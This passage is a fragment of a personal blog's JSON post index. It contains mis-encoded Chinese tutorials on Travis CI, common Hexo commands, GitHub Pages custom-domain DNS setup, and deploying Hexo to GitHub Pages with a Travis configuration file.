æ—¶ï¼Œç”¨åˆ°äº†ä¸€é¡¹æ–°æŠ€æœ¯ã€‚hmmâ€¦ä¹Ÿä¸èƒ½è¯´æ˜¯æ–°æŠ€æœ¯å§ï¼Œåªæ˜¯ä¹‹å‰ä¸€ç›´æœ‰å¬è¯´ï¼Œä½†å´æ²¡æœ‰å®é™…ç”¨è¿‡ã€‚ å®ƒå°±æ˜¯æŒç»­é›†æˆï¼Œå¬ä¸Šå»å¥½åƒæ˜¯ä¸€ä¸ªé«˜å¤§ä¸Šçš„æ¦‚å¿µï¼Œä½†é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šå†™å®Œä»£ç æäº¤ä¹‹åï¼Œä¼šæ ¹æ®ä½ çš„è¦æ±‚ï¼Œè‡ªåŠ¨åšç¼–è¯‘æµ‹è¯•ã€‚ å…¶ä¸­æœ€å‡ºåå¤§æ¦‚å°±æ˜¯Travis CIäº†ï¼Œæœ¬æ–‡çš„ç›®çš„å°±æ˜¯å¿«é€Ÿå…¥é—¨ Travis CIã€‚","text":"æœ€è¿‘ä½¿ç”¨Github Pages æ­å»ºHexo æ—¶ï¼Œç”¨åˆ°äº†ä¸€é¡¹æ–°æŠ€æœ¯ã€‚hmmâ€¦ä¹Ÿä¸èƒ½è¯´æ˜¯æ–°æŠ€æœ¯å§ï¼Œåªæ˜¯ä¹‹å‰ä¸€ç›´æœ‰å¬è¯´ï¼Œä½†å´æ²¡æœ‰å®é™…ç”¨è¿‡ã€‚ å®ƒå°±æ˜¯æŒç»­é›†æˆï¼Œå¬ä¸Šå»å¥½åƒæ˜¯ä¸€ä¸ªé«˜å¤§ä¸Šçš„æ¦‚å¿µï¼Œä½†é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šå†™å®Œä»£ç æäº¤ä¹‹åï¼Œä¼šæ ¹æ®ä½ çš„è¦æ±‚ï¼Œè‡ªåŠ¨åšç¼–è¯‘æµ‹è¯•ã€‚ å…¶ä¸­æœ€å‡ºåå¤§æ¦‚å°±æ˜¯Travis CIäº†ï¼Œæœ¬æ–‡çš„ç›®çš„å°±æ˜¯å¿«é€Ÿå…¥é—¨ Travis CIã€‚ ä»€ä¹ˆæ˜¯æŒç»­é›†æˆï¼ŸæŒç»­é›†æˆ(Continuous Integration)æ˜¯å¯¹å°å‘¨æœŸçš„çš„ä»£ç è¿›è¡Œæ›´æ”¹ï¼Œå…¶ç›®çš„æ˜¯é€šè¿‡ä»¥è¾ƒå°çš„å¢é‡å¼€å‘å’Œæµ‹è¯•æ¥æ„å»ºæ›´å¥åº·çš„è½¯ä»¶ã€‚ è€ŒTravis CI ä½œä¸ºä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œé€šè¿‡è‡ªåŠ¨æ„å»ºå’Œæµ‹è¯•ä»£ç ï¼Œå¹¶æä¾›æ›´æ”¹æˆåŠŸçš„å³æ—¶åé¦ˆã€‚ å¿«é€Ÿä¸Šæ‰‹åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦æå‰å‡†å¤‡å¥½ä»¥ä¸‹å…ˆå†³æ¡ä»¶ï¼š ä¸€ä¸ª GitHub å¸æˆ· æ‰˜ç®¡åœ¨ Github çš„é¡¹ç›®çš„æ‰€æœ‰è€…æƒé™ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šTravis CIä¸æ˜¯å®Œå…¨å…è´¹çš„æœåŠ¡ï¼Œå‰100ä¸ªç§æœ‰æ„å»ºæ˜¯å…è´¹çš„ï¼Œåç»­å°±è¦è¿›è¡Œä»˜è´¹ï¼Œå¦‚æœä½ çš„é¡¹ç›®æ˜¯å¼€æºçš„ï¼Œæˆ–è€…ä½ æ˜¯å­¦ç”Ÿï¼Œåˆ™ä¸å—é™åˆ¶ã€‚ åœ¨Github ä¸Šä½¿ç”¨Travis CI å°† Travis CI æ·»åŠ åˆ°ä½ çš„ GitHub è´¦æˆ·ä¸­ã€‚ å‰å¾€ GitHub çš„ Applications settingsï¼Œé…ç½® Travis CI æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿè®¿é—®ä½ çš„ repositoryã€‚ å‰å¾€ GitHub æ–°å»º Personal Access Tokenï¼Œåªå‹¾é€‰ repo çš„æƒé™å¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ Tokenã€‚Token ç”Ÿæˆåè¯·å¤åˆ¶å¹¶ä¿å­˜å¥½ã€‚ å›åˆ° Travis CIï¼Œå‰å¾€ä½ çš„ repository çš„è®¾ç½®é¡µé¢ï¼Œåœ¨ Environment Variables ä¸‹æ–°å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒName ä¸º GH_TOKENï¼ŒValue ä¸ºåˆšæ‰ä½ åœ¨ GitHub ç”Ÿæˆçš„ Tokenã€‚ç¡®ä¿ DISPLAY VALUE IN BUILD LOG ä¿æŒ ä¸è¢«å‹¾é€‰ é¿å…ä½ çš„ Token æ³„æ¼ã€‚ç‚¹å‡» Add ä¿å­˜ã€‚ åœ¨ä½ çš„é¡¹ç›®ä¸­æ–°å»ºä¸€ä¸ª .travis.yml æ–‡ä»¶ã€‚ æäº¤å¹¶æ¨é€ä»¥è§¦å‘Travis CIæ„å»ºã€‚ å…¶ä¸­.travis.ymlæ–‡ä»¶çš„ç›®çš„æ˜¯å‘Šè¯‰ Travis CI åº”è¯¥åšäº›ä»€ä¹ˆã€‚ ä»¥ä¸‹ç¤ºä¾‹æŒ‡å®šäº†åº”ä½¿ç”¨Ruby 2.2å’Œæœ€æ–°ç‰ˆæœ¬çš„JRubyæ„å»ºçš„Rubyé¡¹ç›®ã€‚ 1234language: rubyrvm: - 2.2 - jruby é€šè¿‡è®¿é—®Travis CI å¹¶é€‰æ‹©repositoryï¼Œæ£€æŸ¥æ„å»ºçŠ¶æ€é¡µé¢ï¼Œä»¥æ ¹æ®æ„å»ºå‘½ä»¤çš„è¿”å›çŠ¶æ€æŸ¥çœ‹æ„å»ºæ˜¯å¦é€šè¿‡æˆ–å¤±è´¥ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]},{"title":"Hexo å¿«é€Ÿä¸Šæ‰‹","slug":"hexo-quick-start","date":"2020-07-05T06:16:31.000Z","updated":"2020-08-15T01:05:05.993Z","comments":true,"path":"hexo-quick-start/","link":"","permalink":"https://www.0x2beace.com/hexo-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨Hexo æ­å»ºäº†ä¸€å¥—åšå®¢ç³»ç»Ÿï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜ç®—é¡ºåˆ©ï¼Œä¸è¿‡è¿˜æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•´ç†è®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ä½¿ç”¨Hexo æ­å»ºäº†ä¸€å¥—åšå®¢ç³»ç»Ÿï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜ç®—é¡ºåˆ©ï¼Œä¸è¿‡è¿˜æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•´ç†è®°å½•ä¸€ä¸‹ã€‚ å¸¸ç”¨å‘½ä»¤initæ–°å»ºä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæ²¡æœ‰è®¾ç½® folderï¼ŒHexo é»˜è®¤åœ¨ç›®å‰çš„æ–‡ä»¶å¤¹å»ºç«‹ç½‘ç«™ã€‚ 1$ hexo init [folder] newlayout æœ‰ä¸‰ç§é€‰æ‹©ï¼š postï¼šæ–°å»ºä¸€ç‰‡æ–‡ç«  pageï¼šæ–°å»ºä¸€ä¸ªé¡µé¢ draftï¼šæ–°å»ºä¸€ç¯‡è‰ç¨¿ å¦‚æœæ²¡æœ‰è®¾ç½® layout çš„è¯ï¼Œé»˜è®¤ä½¿ç”¨ _config.yml ä¸­çš„ default_layout å‚æ•°ä»£æ›¿ã€‚å¦‚æœæ ‡é¢˜åŒ…å«ç©ºæ ¼çš„è¯ï¼Œè¯·ä½¿ç”¨å¼•å·æ‹¬èµ·æ¥ã€‚ 1$ hexo new [layout] &lt;title&gt; generateç”Ÿæˆé™æ€æ–‡ä»¶ã€‚ 12$ hexo generate&#x2F;&#x2F; ç­‰æ•ˆäº hexo g å¸¸ç”¨å‚æ•°ï¼š|é€‰é¡¹|æè¿°||-|-||-d, â€“deploy|æ–‡ä»¶ç”Ÿæˆåç«‹å³éƒ¨ç½²ç½‘ç«™||-w, â€“watch|ç›‘è§†æ–‡ä»¶å˜åŠ¨||-b, â€“bail|ç”Ÿæˆè¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿä»»ä½•æœªå¤„ç†çš„å¼‚å¸¸åˆ™æŠ›å‡ºå¼‚å¸¸| publishå‘è¡¨è‰ç¨¿ 1$ hexo publish [layout] &lt;filename&gt; serverå¯åŠ¨æœåŠ¡å™¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè®¿é—®ç½‘å€ä¸ºï¼š http://localhost:4000/ã€‚ 12$ hexo server&#x2F;&#x2F; ç­‰æ•ˆäº hexo s deployéƒ¨ç½²ç½‘ç«™ã€‚ 12$ hexo deploy&#x2F;&#x2F; ç­‰æ•ˆäº hexo d -gï¼Œ--generateï¼šéƒ¨ç½²ä¹‹å‰é¢„å…ˆç”Ÿæˆé™æ€æ–‡ä»¶ cleanæ¸…é™¤ç¼“å­˜æ–‡ä»¶ (db.json) å’Œå·²ç”Ÿæˆçš„é™æ€æ–‡ä»¶ (public)ã€‚ åœ¨æŸäº›æƒ…å†µï¼ˆå°¤å…¶æ˜¯æ›´æ¢ä¸»é¢˜åï¼‰ï¼Œå¦‚æœå‘ç°å¯¹ç«™ç‚¹çš„æ›´æ”¹æ— è®ºå¦‚ä½•ä¹Ÿä¸ç”Ÿæ•ˆï¼Œé‚£å¯èƒ½éœ€è¦è¿è¡Œè¯¥å‘½ä»¤ã€‚ 1$ hexo clean liståˆ—å‡ºç½‘ç«™èµ„æ–™ã€‚ 1$ hexo list versionæ˜¾ç¤º Hexo ç‰ˆæœ¬ã€‚ 1$ hexo version å…¶ä»–æ¨¡å¼å®‰å…¨æ¨¡å¼åœ¨å®‰å…¨æ¨¡å¼ä¸‹ï¼Œä¸ä¼šè½½å…¥æ’ä»¶å’Œè„šæœ¬ã€‚å½“éœ€è¦å®‰è£…æ–°æ’ä»¶é­é‡é—®é¢˜æ—¶ï¼Œå¯ä»¥å°è¯•ä»¥å®‰å…¨æ¨¡å¼é‡æ–°æ‰§è¡Œã€‚ 1$ hexo --safe è°ƒè¯•æ¨¡å¼åœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯å¹¶è®°å½•åˆ° debug.logã€‚ 1$ hexo --debug æ˜¾ç¤ºè‰ç¨¿æ˜¾ç¤º source/_drafts æ–‡ä»¶å¤¹ä¸­çš„è‰ç¨¿æ–‡ç« ã€‚ 1$ hexo --draft å¸¸è§é—®é¢˜CNAME æ–‡ä»¶è¢«åˆ é™¤GitHub Pages ä¸ºæˆ‘ä»¬å…è´¹æä¾›äº†&lt;username&gt;.github.ioè¿™æ ·çš„åŸŸåä½œä¸º GitHub Pageï¼Œä½†å¦‚æœä½ è§‰å¾—è¿™ä¸ªåŸŸåå¤ªé•¿äº†ï¼Œä¸æ»¡æ„ï¼Œé‚£ä¹ˆä½ ä¹Ÿå¯ä»¥ç»‘å®šè‡ªå·±çš„åŸŸåã€‚ é€šå¸¸ç»‘å®šå®Œæˆä¹‹åï¼Œä¼šåœ¨é¡¹ç›®ç›®å½•ä¸‹é¢ç”Ÿæˆä¸€ä¸ªå«åšCNAMEçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯ç”¨æ¥è®°å½•GitHub Pages æ‰€ç»‘å®šçš„åŸŸåã€‚ è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼š CNAMEæ–‡ä»¶ä¼šåœ¨æ¯æ¬¡ hexo deploy æ—¶æ¶ˆå¤±ï¼Œç„¶åéœ€è¦é‡æ–°æ‰‹åŠ¨ç»‘å®šï¼Œè¿™æ ·å°±å¾ˆç¹çã€‚ æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š æ¯æ¬¡ hexo d ä¹‹åï¼Œå°±å» GitHub ä»“åº“æ ¹ç›®å½•æ–°å»º CNAMEæ–‡ä»¶ã€‚â€”â€” ç¹ç åœ¨ hexo g ä¹‹åï¼Œ hexo d ä¹‹å‰ï¼ŒæŠŠCNAMEæ–‡ä»¶å¤åˆ¶åˆ° public ç›®å½•ä¸‹é¢ï¼Œé‡Œé¢å†™å…¥ä½ è¦ç»‘å®šçš„åŸŸåã€‚â€”â€” ç¹ç å°†éœ€è¦ä¸Šä¼ è‡³ GitHub çš„å†…å®¹æ”¾åœ¨sourceæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚CNAMEã€favicon.icoã€imagesç­‰ï¼Œè¿™æ ·åœ¨ hexo d ä¹‹åå°±ä¸ä¼šè¢«åˆ é™¤äº†ã€‚ é€šè¿‡å®‰è£…æ’ä»¶å®ç°æ°¸ä¹…ä¿ç•™ã€‚ 1$ npm install hexo-generator-cname --save ç¼–è¾‘_config.yml 12Plugins:- hexo-generator-cname æ¨èç¬¬ä¸‰ç§æ–¹å¼ï¼Œç®€å•æ–¹ä¾¿ã€‚ é…ç½®apex åŸŸGithub Pages æ˜¯æ”¯æŒç»‘å®šè‡ªå·±çš„ç§æœ‰åŸŸåçš„ï¼Œä½†é»˜è®¤åªèƒ½ç»‘å®š CNAMEçš„ç§æœ‰å­åŸŸåï¼Œé‚£æœ‰æ²¡æœ‰åŠæ³•ä¸»åŸŸåå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ å¦‚æœç»‘å®šä¸»åŸŸåï¼Œä¾‹å¦‚ example.comï¼Œå»ºè®®è¿˜è®¾ç½®ä¸€ä¸ª www å­åŸŸï¼ŒGitHub Pages å°†è‡ªåŠ¨åœ¨åŸŸä¹‹é—´åˆ›å»ºé‡å®šå‘ï¼Œå½“è¾“å…¥example.comæ—¶ï¼Œä¼šé‡å®šå‘åˆ° www.example.comã€‚ é€šå¸¸æˆ‘ä»¬ç»‘å®šå¥½ç§æœ‰å­åŸŸåä¹‹åï¼Œå›ç”Ÿæˆä¸€ä¸ªCNAMEçš„æ–‡ä»¶ï¼Œé‡Œé¢è®°å½•ç€æˆ‘ä»¬ç»‘å®šå¥½çš„ç§æœ‰å­åŸŸåã€‚ æ­¤æ—¶åªéœ€è¦å»DNS åšè§£æï¼Œåˆ›å»ºä¸€ä¸ªALIASã€ANAME æˆ– A è®°å½•ï¼š åˆ›å»ºALIASã€ANAMEè®°å½•ï¼šå°† apex åŸŸæŒ‡å‘ç«™ç‚¹çš„é»˜è®¤åŸŸã€‚ åˆ›å»ºA è®°å½•ï¼šå°† apex åŸŸæŒ‡å‘ GitHub Pages çš„ IP åœ°å€ã€‚ 12345&#x2F;&#x2F; GitHub Pages çš„ IP åœ°å€185.199.108.153185.199.109.153185.199.110.153185.199.111.153 è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯åˆ›å»ºA è®°å½•ï¼Œæ‰€ä»¥æˆ‘çš„DNS è§£ææ˜¯è¿™æ ·çš„ï¼š é…ç½®å®ŒDNS è§£æä¹‹åï¼Œå¯ä»¥ä½¿ç”¨digå‘½ä»¤æ¥æ£€éªŒæ˜¯å¦è§£ææˆåŠŸï¼š 12345678$ dig example.com +noall +answer; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer;; global options: +cmd0x2BeAce.com. 4502 IN A 185.199.111.1530x2BeAce.com. 4502 IN A 185.199.110.1530x2BeAce.com. 4502 IN A 185.199.108.1530x2BeAce.com. 4502 IN A 185.199.109.153 å°†example.com æ›¿æ¢æˆä½ è‡ªå·±çš„ apex åŸŸï¼Œç¡®è®¤ç»“æœä¸ä¸Šé¢ GitHub Pages çš„ IP åœ°å€ç›¸åŒ¹é…ã€‚ è‡³æ­¤ï¼Œå°±å®Œæˆäº†apex åŸŸçš„é…ç½®äº†ã€‚ å‚è€ƒé“¾æ¥ github+hexoæ­å»ºè‡ªå·±çš„åšå®¢ç½‘ç«™ï¼ˆä¸ƒï¼‰æ³¨æ„äº‹é¡¹ Hexo | æŒ‡ä»¤ ç®¡ç† GitHub Pages ç«™ç‚¹çš„è‡ªå®šä¹‰åŸŸ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Github Pages éƒ¨ç½² Hexo ä¸ªäººåšå®¢","slug":"deploy-hexo-using-github-pages-personal-blog","date":"2020-07-04T12:09:09.000Z","updated":"2020-08-15T01:11:07.291Z","comments":true,"path":"deploy-hexo-using-github-pages-personal-blog/","link":"","permalink":"https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/","excerpt":"å…³äºä¸ªäººåšå®¢ï¼Œåœ¨å¾ˆä¹…ä¹‹å‰å°±æƒ³è‡ªå·±æ­å»ºä¸€å¥—ï¼Œç”šè‡³è¿˜ä¸ºæ­¤ä¹°äº†ä¸€å°æœåŠ¡å™¨ï¼Œä½†å¥ˆä½•è‡ªå·±å¤ªå¿™äº†(tai lan le) =_=ï¼Œè¿™ä»¶äº‹æƒ…å°±ä¸€ç›´ææµ…äº†ï¼ŒæœåŠ¡å™¨å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿéƒ½æ˜¯ç©ºé—²çŠ¶æ€ã€‚ è¿™æ®µæ—¶é—´ï¼Œçªç„¶å¾ˆæƒ³æŠŠè¿™ä»¶äº‹æƒ…åšå¥½ï¼Œè§‰å¾—ä¸èƒ½åœ¨è¿™ä¹ˆæ‹–ä¸‹å»äº†ï¼Œæ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚","text":"å…³äºä¸ªäººåšå®¢ï¼Œåœ¨å¾ˆä¹…ä¹‹å‰å°±æƒ³è‡ªå·±æ­å»ºä¸€å¥—ï¼Œç”šè‡³è¿˜ä¸ºæ­¤ä¹°äº†ä¸€å°æœåŠ¡å™¨ï¼Œä½†å¥ˆä½•è‡ªå·±å¤ªå¿™äº†(tai lan le) =_=ï¼Œè¿™ä»¶äº‹æƒ…å°±ä¸€ç›´ææµ…äº†ï¼ŒæœåŠ¡å™¨å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿéƒ½æ˜¯ç©ºé—²çŠ¶æ€ã€‚ è¿™æ®µæ—¶é—´ï¼Œçªç„¶å¾ˆæƒ³æŠŠè¿™ä»¶äº‹æƒ…åšå¥½ï¼Œè§‰å¾—ä¸èƒ½åœ¨è¿™ä¹ˆæ‹–ä¸‹å»äº†ï¼Œæ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ ä¸ºä»€ä¹ˆä½¿ç”¨Github Pagesï¼Ÿ æˆ‘æ˜¯å‡ºäºä»¥ä¸‹åŸå› è€ƒè™‘çš„ï¼š æš‚æ—¶æ²¡æœ‰æœåŠ¡å™¨çš„éœ€è¦ï¼Œæˆ‘åªæƒ³æœ‰ä¸€ä¸ªèƒ½å†™åšå®¢çš„åœ°æ–¹ã€‚ GitHub Pages å¯ä»¥æä¾› httpsæœåŠ¡ï¼Œæˆ‘ä¸ç”¨æ‹…å¿ƒåŸŸåå¤‡æ¡ˆçš„é—®é¢˜ã€‚ å…è´¹ æ€»ä¹‹ï¼Œå¦‚æœä½ æƒ³ç”¨æœ€ç®€å•ã€æœ€çœå¿ƒçš„æ–¹å¼ï¼Œæ­å»ºå±äºè‡ªå·±çš„åšå®¢ï¼Œé‚£ä¹ˆ Github Pages ä¸€å®šä¸ä¼šè®©ä½ å¤±æœ›ã€‚ ç³»ç»Ÿç¯å¢ƒ Mac OS 10.15.4 Node.js 12 Hexo-cli: 3.1 NPM: 6.9 åˆ›å»ºGithub PagesGithub Pagesåˆ†ä¸ºä¸¤ç±»ï¼Œç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µã€é¡¹ç›®ä¸»é¡µã€‚ ç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µï¼šåœ¨æ–°å»ºä»“åº“æ—¶ï¼Œä»“åº“åç§°åº”è¯¥ä»¥&lt;yourusername&gt;.github.ioçš„æ ¼å¼å»å¡«å†™ã€‚&lt;yourusername&gt;æŒ‡çš„æ˜¯ä½ çš„Github çš„ç”¨æˆ·åç§°ã€‚ åˆ›å»ºé¡¹ç›®ä¸»é¡µï¼šåœ¨æ–°å»ºä»“åº“æ—¶ï¼Œåç§°å¯ä»¥ä»»æ„è®¾ç½®ï¼Œç„¶åé€šè¿‡Setting-&gt;Options-&gt;Github Pageså°† Sourceé€‰é¡¹è®¾ç½®ä¸ºMaster Branchï¼Œæ­¤æ—¶è¿™ä¸ªé¡¹ç›®å°±å˜æˆä¸€ä¸ª Github Pagesé¡¹ç›®äº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š Github Pages åªé’ˆå¯¹å¼€æºçš„é¡¹ç›®æ˜¯å…è´¹çš„ï¼Œå¦‚æœä½ ä¸æƒ³å¼€æºï¼Œé‚£å¯èƒ½å°±éœ€è¦è€ƒè™‘æ”¶è´¹çš„å¥—é¤äº†ã€‚ ç¬¬ä¸€ç§æ–¹å¼ä¸èƒ½æ›´æ”¹ Github Pages éƒ¨ç½²åˆ†æ”¯ã€‚ å¦‚æœä½ æœ‰è‡ªå·±çš„åŸŸåï¼Œé‚£ä¹ˆæ¨èä½¿ç”¨æ–¹å¼äºŒåˆ›å»º Github Pagesã€‚å¦‚æœä½ æ²¡æœ‰è‡ªå·±çš„åŸŸåï¼Œé‚£ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨Github Pages æä¾›çš„åŸŸåè®¿é—®http://&lt;yourusername&gt;.github.ioã€‚ ç»‘å®šåŸŸåå¦‚æœä½ æ˜¯é€šè¿‡æ–¹å¼ä¸€ï¼Œåˆ›å»ºçš„Github Pagesï¼Œé‚£ä¹ˆå¯ä»¥è·³è¿‡æ­¤éƒ¨åˆ†ã€‚ åœ¨ 2018 å¹´ 5 æœˆ 1 æ—¥ä¹‹åï¼ŒGitHub Pages å·²ç»å¼€å§‹æä¾›å…è´¹ä¸ºè‡ªå®šä¹‰åŸŸåå¼€å¯ HTTPS çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¤§å¤§ç®€åŒ–äº†æ“ä½œçš„æµç¨‹ï¼Œç°åœ¨ç”¨æˆ·å·²ç»ä¸å†éœ€è¦è‡ªå·±æä¾›è¯ä¹¦ï¼Œåªéœ€è¦å°†è‡ªå·±çš„åŸŸåä½¿ç”¨ CNAME çš„æ–¹å¼æŒ‡å‘è‡ªå·±çš„ GitHub Pages åŸŸåå³å¯ã€‚ é¦–å…ˆéœ€è¦åœ¨ä½ çš„ DNS è§£æé‡Œæ·»åŠ ä¸€æ¡è§£æè®°å½•ï¼Œä¾‹å¦‚æˆ‘é€‰æ‹©æ·»åŠ å­åŸŸåblog.aikang.meï¼Œé€šè¿‡ CNAME çš„æ–¹å¼æŒ‡å‘æˆ‘åˆšåˆšè‡ªå®šä¹‰çš„ GitHub Pages åŸŸå 0xAiKang.github.ioã€‚ æ·»åŠ å®Œæˆåç­‰å¾… DNS è§£æçš„ç”Ÿæ•ˆçš„åŒæ—¶å›åˆ°é¡¹ç›®çš„Settingç•Œé¢ï¼Œå°†åˆšæ‰çš„å­åŸŸåä¸ Github Pages ç»‘å®šåœ¨ä¸€èµ·ã€‚ ä¿å­˜ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦è€å¿ƒç­‰å¾… GitHub ç”Ÿæˆè¯ä¹¦å¹¶ç¡®è®¤åŸŸåçš„è§£ææ˜¯å¦æ­£å¸¸ã€‚ å°†Hexo éƒ¨ç½²åˆ°Github PagesåŸŸåè§£ææˆåŠŸä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡æˆ‘ä»¬åˆšæ‰ç»‘å®šçš„åŸŸåè¿›è¡Œè®¿é—®äº†ï¼Œä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œç°åœ¨åªèƒ½çœ‹åˆ°ä¸€ç‰‡ç©ºç™½ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç½‘ç«™è¿˜æ²¡æœ‰ä»»ä½•å†…å®¹ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯é€‰æ‹©ä¸€å¥—é™æ€æ¨¡ç‰ˆç³»ç»Ÿã€‚ ç›®å‰å¸‚åœºä¸Šæœ‰å¾ˆå¤šä¼˜ç§€çš„é™æ€æ¨¡æ¿ç³»ç»Ÿï¼Œæ¯”å¦‚ï¼š Node.js ç¼–å†™çš„ Hexo Go ç¼–å†™çš„ Hugo Python ç¼–å†™çš„ Pelican é™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ Gridea ä¸ºä»€ä¹ˆè¦é€‰æ‹©Hexoï¼Ÿ æœ€åˆåœ¨é€‰æ‹©åšå®¢æ¨¡ç‰ˆç³»ç»Ÿæ—¶ï¼Œå¹¶æ²¡æœ‰å‘ç° Gridea ï¼Œäº‹åå‘ç°è¿™ä¸ªå°ä¼—çš„é™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ä¼¼ä¹æ‰æ˜¯æˆ‘çœŸæ­£æƒ³è¦çš„ã€‚ ä¸è¿‡æ—¢ç„¶é€‰æ‹©äº†Hexoï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒçš„ç”Ÿæ€ç¯å¢ƒå¾ˆå¤§ï¼Œå¯é€‰ä¸»é¢˜éå¸¸å¤šï¼Œå¹¶ä¸”éƒ½æ˜¯å¼€æºçš„ã€‚ å¦‚ä½•å°† Hexo éƒ¨ç½²åˆ° GitHub Pagesï¼Ÿ å°† Travis CI æ·»åŠ åˆ°ä½ çš„ GitHub è´¦æˆ·ä¸­ã€‚ å‰å¾€ GitHub çš„ Applications settingsï¼Œé…ç½® Travis CI æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿè®¿é—®ä½ çš„ repositoryã€‚ æ­£å¸¸æƒ…å†µä¸‹ä½ ä¼šè¢«é‡å®šå‘åˆ° Travis CI çš„é¡µé¢ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¯· æ‰‹åŠ¨å‰å¾€ã€‚ å‰å¾€ GitHub æ–°å»º Personal Access Tokenï¼Œåªå‹¾é€‰ repo çš„æƒé™å¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ Tokenã€‚Token ç”Ÿæˆåè¯·å¤åˆ¶å¹¶ä¿å­˜å¥½ã€‚ å›åˆ° Travis CIï¼Œå‰å¾€ä½ çš„ repository çš„è®¾ç½®é¡µé¢ï¼Œåœ¨ Environment Variables ä¸‹æ–°å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒName ä¸º GH_TOKENï¼ŒValue ä¸ºåˆšæ‰ä½ åœ¨ GitHub ç”Ÿæˆçš„ Tokenã€‚ç¡®ä¿ DISPLAY VALUE IN BUILD LOG ä¿æŒ ä¸è¢«å‹¾é€‰ é¿å…ä½ çš„ Token æ³„æ¼ã€‚ç‚¹å‡» Add ä¿å­˜ã€‚ åœ¨ä½ çš„ Hexo ç«™ç‚¹æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ª .travis.yml æ–‡ä»¶ï¼š 123456789101112131415161718sudo: falselanguage: node_jsnode_js: - 10 # use nodejs v10 LTScache: npmbranches: only: - master # build master branch onlyscript: - hexo generate # generate static filesdeploy: provider: pages skip-cleanup: true github-token: $GH_TOKEN keep-history: true on: branch: master local-dir: public ä¸Šé¢è¿™ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨æ˜¯ç”¨æ¥è‡ªåŠ¨æ„å»ºï¼Œç¼–è¯‘æµ‹è¯•ã€‚ å°† .travis.yml æ¨é€åˆ° repository ä¸­ã€‚Travis CI ä¼šè‡ªåŠ¨å¼€å§‹è¿è¡Œï¼Œå¹¶å°†ç”Ÿæˆçš„æ–‡ä»¶æ¨é€åˆ°åŒä¸€ repository ä¸‹çš„ gh-pages åˆ†æ”¯ä¸‹ã€‚ ä¿®æ”¹å‘å¸ƒæºæ¨é€å®Œæˆä¹‹åï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ª gh-gagesåˆ†æ”¯ï¼Œè¿™ä¸ªåˆ†æ”¯å°±æ˜¯ç”¨äºéƒ¨ç½²ç«™ç‚¹çš„åˆ†æ”¯ï¼Œä½†æ˜¯GitHub Pages ä¼šé»˜è®¤ä½¿ç”¨masteråˆ†æ”¯ä½œä¸ºå‘å¸ƒæºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ‡æ¢å‘å¸ƒæºã€‚ åœ¨Setting-&gt;Option-&gt;GitHub Pagesä¸‹ï¼Œä½¿ç”¨ 